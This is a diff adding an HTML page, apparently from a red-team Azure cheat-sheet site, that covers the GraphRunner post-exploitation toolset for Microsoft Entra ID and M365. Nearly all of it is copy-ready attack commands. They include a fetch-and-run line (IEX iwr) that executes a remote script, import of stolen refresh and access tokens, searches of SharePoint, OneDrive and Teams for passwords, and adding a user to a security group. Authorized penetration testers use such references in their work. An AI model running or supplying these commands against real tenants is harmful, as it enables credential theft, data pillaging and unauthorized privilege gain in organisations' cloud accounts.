@@ -1,0 +1,299 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GraphRunner</title>
+    <link rel="stylesheet" href="azure.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <script>
+        function toggleSection(id) {
+            const body = document.getElementById(id);
+            const icon = document.querySelector(`[data-toggle="${id}"] .toggle-icon`);
+            body.classList.toggle('collapsed');
+            icon.textContent = body.classList.contains('collapsed') ? 'â–¶' : 'â–¼';
+        }
+
+        function copyToClipboard(command, btn) {
+            navigator.clipboard.writeText(command).then(() => {
+                if (btn) {
+                    const orig = btn.textContent;
+                    btn.textContent = 'âœ“';
+                    setTimeout(() => { btn.textContent = orig; }, 1500);
+                }
+            }).catch(err => console.error('Failed to copy:', err));
+        }
+
+        function escapeHtml(s) {
+            return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+        }
+
+        // Lightweight syntax highlighting (input is already HTML-escaped)
+        function azSyntax(s) {
+            s = s.replace(/\$\{?\w+\}?/g, m => `<span class="tok-var">${m}</span>`);
+            s = s.replace(/\b(IEX|iwr|List-GraphRunnerModules|Get-GraphTokens|Invoke-RefreshGraphTokens|Invoke-SearchSharePointAndOneDrive|Invoke-SearchTeams|Get-SecurityGroups|Get-UserObjectID|Invoke-AddGroupMember|Invoke-ImportTokens|Get-DynamicGroups)\b/g, '<span class="tok-key">$1</span>');
+            return s;
+        }
+
+        function azGet(id) {
+            const el = document.getElementById(id);
+            return el ? el.value.trim() : '';
+        }
+
+        function azSpan(raw, fallback) {
+            const v = raw || fallback;
+            return raw
+                ? `<span class="val-filled">${escapeHtml(v)}</span>`
+                : `<span class="val-empty">${escapeHtml(v)}</span>`;
+        }
+
+        function azUpdate() {
+            const searchRaw = azGet('searchTermInput');
+            const userRaw   = azGet('usernameInput');
+            const gidRaw    = azGet('gidInput');
+            const uidRaw    = azGet('uidInput');
+            const refreshRaw = azGet('refreshTokenInput');
+            const accessRaw = azGet('accessTokenInput');
+            const searchSpan = azSpan(searchRaw, 'password');
+            const userSpan   = azSpan(userRaw, '{USERNAME1@COMPANY.com}');
+            const gidSpan    = azSpan(gidRaw, '<gid>');
+            const uidSpan    = azSpan(uidRaw, '<uid>');
+            const refreshSpan = azSpan(refreshRaw, '');
+            const accessSpan = azSpan(accessRaw, '');
+            document.querySelectorAll('.command').forEach(el => {
+                let raw = el.getAttribute('data-base');
+                if (raw === null) {
+                    if (el.dataset.orig === undefined) el.dataset.orig = el.textContent;
+                    raw = el.dataset.orig;
+                }
+                el.innerHTML = azSyntax(escapeHtml(raw))
+                    .replaceAll('{SEARCHTERM}', () => searchSpan)
+                    .replaceAll('{USERNAME}', () => userSpan)
+                    .replaceAll('{GID}', () => gidSpan)
+                    .replaceAll('{UID}', () => uidSpan)
+                    .replaceAll('{REFRESHTOKEN}', () => refreshSpan)
+                    .replaceAll('{ACCESSTOKEN}', () => accessSpan);
+            });
+            try {
+                localStorage.setItem('az_gr_search', searchRaw);
+                localStorage.setItem('az_gr_user', userRaw);
+                localStorage.setItem('az_gr_gid', gidRaw);
+                localStorage.setItem('az_gr_uid', uidRaw);
+                localStorage.setItem('az_gr_refresh', refreshRaw);
+                localStorage.setItem('az_gr_access', accessRaw);
+            } catch (e) {}
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            try {
+                const map = { searchTermInput: 'az_gr_search', usernameInput: 'az_gr_user', gidInput: 'az_gr_gid', uidInput: 'az_gr_uid', refreshTokenInput: 'az_gr_refresh', accessTokenInput: 'az_gr_access' };
+                Object.entries(map).forEach(([id, key]) => {
+                    const el = document.getElementById(id);
+                    const val = localStorage.getItem(key) || '';
+                    if (el && val) el.value = val;
+                });
+            } catch (e) {}
+            azUpdate();
+        });
+    </script>
+</head>
+<body>
+
+<!-- â”€â”€ Sidebar â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ -->
+<div class="side-nav">
+    <h2>Azure</h2>
+    <ul>
+        <li class="nav-group ng-std">Tools</li>
+        <li><a href="az-powershell.html">AZ PowerShell</a></li>
+        <li><a href="az-cli.html">AZ CLI</a></li>
+        <li><a href="mg-graph.html">MG Graph</a></li>
+        <li><a href="tokens.html">Tokens</a></li>
+        <li><a href="cloud-prowl.html">Cloud Prowl</a></li>
+        <li><a href="roadtx.html">roadtx</a></li>
+        <li><a href="aadinternals.html">AADInternals</a></li>
+        <li><a href="graphrunner.html">GraphRunner</a></li>
+        <li class="nav-divider"></li>
+        <li class="nav-group ng-std">Pages</li>
+        <li><a href="external-recon.html">External Recon</a></li>
+        <li><a href="identity-users-creds.html">Identity: Valid Users &amp; Creds</a></li>
+        <li><a href="internal-recon.html">Internal (Resource) Recon</a></li>
+        <li><a href="cap.html">CAP</a></li>
+        <li><a href="mfa.html">MFA</a></li>
+        <li><a href="phs.html">PHS</a></li>
+        <li><a href="managed-identity.html">Managed Identity</a></li>
+        <!-- ADD NEW PAGE LINKS HERE -->
+        <li class="nav-divider"></li>
+        <li class="nav-group ng-std">Resources</li>
+        <li><a href="virtual-machines.html">Virtual Machines</a></li>
+        <li><a href="automation-account.html">Automation Account</a></li>
+        <li><a href="network.html">Network</a></li>
+        <li><a href="power-platform.html">Power Platform (BAP)</a></li>
+        <li><a href="storage-account.html">Storage Account</a></li>
+        <li><a href="container-app.html">Container App</a></li>
+        <li><a href="mysql-flexible-server.html">MySQL Flexible Server</a></li>
+        <li><a href="azure-key-vault.html">Azure Key Vault</a></li>
+        <li><a href="sites.html">Sites</a></li>
+        <li><a href="automation.html">Automation</a></li>
+        <!-- ADD NEW RESOURCE LINKS HERE -->
+        <li class="nav-divider"></li>
+        <li class="nav-group ng-std">Sections</li>
+        <li><a href="#load">Load GraphRunner</a></li>
+        <!-- ADD NEW SECTION LINKS HERE -->
+    </ul>
+</div>
+
+<!-- â”€â”€ Main Content â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ -->
+<div class="main-content">
+
+    <h1 class="page-title">GraphRunner</h1>
+    <p class="page-subtitle"><strong>GraphRunner</strong> (dafthack) â€” a post-exploitation toolset for Microsoft Entra ID / M365 that enumerates and pillages a tenant through the Microsoft Graph API.</p>
+
+    <!-- â•â• LOAD GRAPHRUNNER â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• -->
+    <div class="topic-section red" id="load">
+        <h3 data-toggle="load-body" onclick="toggleSection('load-body')">
+            <i class="fas fa-bolt"></i> Load GraphRunner
+            <span class="toggle-icon">â–¼</span>
+        </h3>
+        <div class="topic-body" id="load-body">
+
+            <div class="command-container">
+                <div class="description"><strong>Load GraphRunner</strong> â€” pull it from GitHub into the session:</div>
+                <div class="command-box">
+                    <span class="command">IEX (iwr 'https://raw.githubusercontent.com/dafthack/GraphRunner/main/GraphRunner.ps1')</span>
+                    <button onclick="copyToClipboard(this.previousElementSibling.textContent, this)">ðŸ“„</button>
+                </div>
+
+                <div class="description"><strong>Get tokens</strong> (authenticate â€” device code flow):</div>
+                <div class="command-box">
+                    <span class="command">Get-GraphTokens</span>
+                    <button onclick="copyToClipboard(this.previousElementSibling.textContent, this)">ðŸ“„</button>
+                </div>
+
+                <div class="description"><strong>List the available modules</strong>:</div>
+                <div class="command-box">
+                    <span class="command">List-GraphRunnerModules</span>
+                    <button onclick="copyToClipboard(this.previousElementSibling.textContent, this)">ðŸ“„</button>
+                </div>
+
+                <div class="description"><strong>Import tokens</strong> (if you have refresh and access tokens):</div>
+                <div class="user-bar">
+                    <label for="refreshTokenInput"><i class="fas fa-key"></i> Refresh Token</label>
+                    <input type="text" id="refreshTokenInput" placeholder="<refresh_token>" oninput="azUpdate()">
+                    <label for="accessTokenInput"><i class="fas fa-key"></i> Access Token</label>
+                    <input type="text" id="accessTokenInput" placeholder="<access_token>" oninput="azUpdate()">
+                    <button type="button" class="cl-clear-btn" onclick="clearInputs(this)"><i class="fas fa-eraser"></i> Clear</button>
+                </div>
+                <div class="command-box">
+                    <span class="command" data-base='$refreshToken="{REFRESHTOKEN}"'></span>
+                    <button onclick="copyToClipboard(this.previousElementSibling.textContent, this)">ðŸ“„</button>
+                </div>
+                <div class="command-box">
+                    <span class="command" data-base='$accessToken="{ACCESSTOKEN}"'></span>
+                    <button onclick="copyToClipboard(this.previousElementSibling.textContent, this)">ðŸ“„</button>
+                </div>
+                <div class="command-box">
+                    <span class="command">Invoke-ImportTokens -AccessToken $accessToken -RefreshToken $refreshToken</span>
+                    <button onclick="copyToClipboard(this.previousElementSibling.textContent, this)">ðŸ“„</button>
+                </div>
+            </div>
+
+            <div class="note-box info">
+                <i class="fas fa-lightbulb"></i>
+                <span>Use <code>Invoke-RefreshGraphTokens</code> when your current GraphRunner access token expires.</span>
+            </div>
+
+        </div><!-- /load-body -->
+    </div><!-- /load -->
+
+    <!-- â•â• GET DYNAMIC GROUPS â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• -->
+    <div class="topic-section blue" id="dynamic-groups">
+        <h3 data-toggle="dynamic-groups-body" onclick="toggleSection('dynamic-groups-body')">
+            <i class="fas fa-sitemap"></i> Get Dynamic Groups
+            <span class="toggle-icon">â–¼</span>
+        </h3>
+        <div class="topic-body" id="dynamic-groups-body">
+            <div class="command-container">
+                <div class="description"><strong>Get dynamic groups</strong>:</div>
+                <div class="command-box">
+                    <span class="command">Get-DynamicGroups -Tokens $tokens</span>
+                    <button onclick="copyToClipboard(this.previousElementSibling.textContent, this)">ðŸ“„</button>
+                </div>
+            </div>
+        </div>
+    </div><!-- /dynamic-groups -->
+
+    <!-- â•â• PILLAGE SHAREPOINT & ONEDRIVE â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• -->
+    <div class="topic-section green" id="pillage">
+        <h3 data-toggle="pillage-body" onclick="toggleSection('pillage-body')">
+            <i class="fas fa-magnifying-glass-dollar"></i> Pillage
+            <span class="toggle-icon">â–¼</span>
+        </h3>
+        <div class="topic-body" id="pillage-body">
+            <div class="command-container">
+                <div class="user-bar">
+                    <label for="searchTermInput"><i class="fas fa-magnifying-glass"></i> Search Term</label>
+                    <input type="text" id="searchTermInput" placeholder="password" oninput="azUpdate()">
+                    <button type="button" class="cl-clear-btn" onclick="clearInputs(this)"><i class="fas fa-eraser"></i> Clear</button>
+                </div>
+                <div class="description"><strong>Search SharePoint &amp; OneDrive</strong> for a term (e.g. password):</div>
+                <div class="command-box">
+                    <span class="command" data-base="Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm {SEARCHTERM}"></span>
+                    <button onclick="copyToClipboard(this.previousElementSibling.textContent, this)">ðŸ“„</button>
+                </div>
+                <div class="description"><strong>Search Teams messages</strong> for a term (e.g. password):</div>
+                <div class="command-box">
+                    <span class="command" data-base="Invoke-SearchTeams -Tokens $tokens -SearchTerm {SEARCHTERM}"></span>
+                    <button onclick="copyToClipboard(this.previousElementSibling.textContent, this)">ðŸ“„</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- â•â• ADD GROUP MEMBER â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• -->
+    <div class="topic-section peach" id="add-group-member">
+        <h3 data-toggle="add-group-member-body" onclick="toggleSection('add-group-member-body')">
+            <i class="fas fa-user-plus"></i> Add Member to Entra ID Group
+            <span class="toggle-icon">â–¼</span>
+        </h3>
+        <div class="topic-body" id="add-group-member-body">
+            <div class="command-container">
+
+                <div class="description"><strong>List security groups</strong> (get the group ID):</div>
+                <div class="command-box">
+                    <span class="command">Get-SecurityGroups -Tokens $tokens</span>
+                    <button onclick="copyToClipboard(this.previousElementSibling.textContent, this)">ðŸ“„</button>
+                </div>
+
+                <div class="user-bar">
+                    <label for="usernameInput"><i class="fas fa-user"></i> Username (UPN)</label>
+                    <input type="text" id="usernameInput" placeholder="{USERNAME1@COMPANY.com}" oninput="azUpdate()">
+                    <button type="button" class="cl-clear-btn" onclick="clearInputs(this)"><i class="fas fa-eraser"></i> Clear</button>
+                </div>
+                <div class="description"><strong>Get a user's object ID</strong>:</div>
+                <div class="command-box">
+                    <span class="command" data-base="Get-UserObjectID -Tokens $tokens {USERNAME}"></span>
+                    <button onclick="copyToClipboard(this.previousElementSibling.textContent, this)">ðŸ“„</button>
+                </div>
+
+                <div class="user-bar">
+                    <label for="gidInput"><i class="fas fa-users"></i> Group ID</label>
+                    <input type="text" id="gidInput" placeholder="<gid>" oninput="azUpdate()">
+                    <label for="uidInput"><i class="fas fa-id-badge"></i> User ID</label>
+                    <input type="text" id="uidInput" placeholder="<uid>" oninput="azUpdate()">
+                    <button type="button" class="cl-clear-btn" onclick="clearInputs(this)"><i class="fas fa-eraser"></i> Clear</button>
+                </div>
+                <div class="description"><strong>Add the user to the group</strong>:</div>
+                <div class="command-box">
+                    <span class="command" data-base="Invoke-AddGroupMember -groupId {GID} -userId {UID} -Tokens $tokens"></span>
+                    <button onclick="copyToClipboard(this.previousElementSibling.textContent, this)">ðŸ“„</button>
+                </div>
+
+            </div>
+        </div>
+    </div><!-- /add-group-member -->
+
+</div><!-- /main-content -->
+<script src="azure.js"></script>
+</body>
+</html>
+
